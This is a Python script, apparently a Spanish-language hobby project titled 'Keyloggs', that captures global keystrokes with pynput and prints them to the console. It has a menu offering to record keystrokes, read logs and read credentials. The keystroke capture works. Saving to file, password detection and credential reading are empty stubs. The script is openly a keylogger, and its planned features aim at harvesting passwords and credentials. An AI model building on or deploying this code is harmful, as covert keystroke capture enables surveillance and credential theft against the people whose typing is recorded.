#!/usr/bin/env python
import enum
import pathlib

from pynput import keyboard as kb

keymap = {
    kb.Key.space: ' ',
    kb.Key.tab: '\t',
    kb.Key.enter: '\n',
    kb.Key.backspace: '\b'
}


class Option(enum.Enum):
    RECORD_KEYS = 1
    READ_LOGS = 2
    READ_CREDENTIALS = 3


def print_data_console(value):
    print(value, end='')


def save_in_file():
    pass


def detect_eip_password():
    pass


def process(key):
    value = None
    if isinstance(key, kb.Key):
        value = keymap.get(key, '')
    elif isinstance(key, kb.KeyCode):
        value = str(key.char)

    return value


def record_key():
    buffer = ''
    with kb.Events() as keyboard_events:
        for event in keyboard_events:
            if event.key == kb.Key.esc:
                break
            elif isinstance(event, kb.Events.Press):
                value = process(event.key)
                if value is not None:
                    buffer = ''.join([buffer, value])
                    print_data_console(value)
    print('\nHa escrito todo esto:\n')
    print(buffer)


def read_logs(path):
    with open(path, 'r', encoding='utf-8') as infile:
        lines = infile.readlines()
    print(lines)


def read_credentials():
    pass


def logo():
    ascii_art = '''
     _  __         _ _                   
    | |/ /___ _  _| | |___  __ _ __ _ ___
    | ' </ -_) || | | / _ \/ _` / _` (_-<
    |_|\_\___|\_, |_|_\___/\__, \__, /__/
              |__/         |___/|___/    
    '''

    return ascii_art


def menu():
    display = '\n'.join([
        '¿Qué desea hacer?',
        '\t(1) Registrar pulsaciones de teclado',
        '\t(2) Leer registros',
        '\t(3) Leer credenciales'
    ])

    return display


def choose(option):
    base_dir = pathlib.Path(__file__).resolve().parent
    try:
        option = Option(int(option))
        if option == Option.RECORD_KEYS:
            record_key()
        elif option == Option.READ_LOGS:
            pass
        elif option == Option.READ_CREDENTIALS:
            pass
    except ValueError:
        reason = 'Opción no válida' if len(option) > 0 else 'No se ha elegido nada'
        print(reason)


def main():
    print(logo())
    stay = True
    while stay:
        print(menu())
        option = input('Escoja una opción [1-3] (Q para salir): ').lower().strip()
        if option == 'q':
            stay = False
        else:
            choose(option)

    print('¡Hasta otra!')


if __name__ == '__main__':
    main()
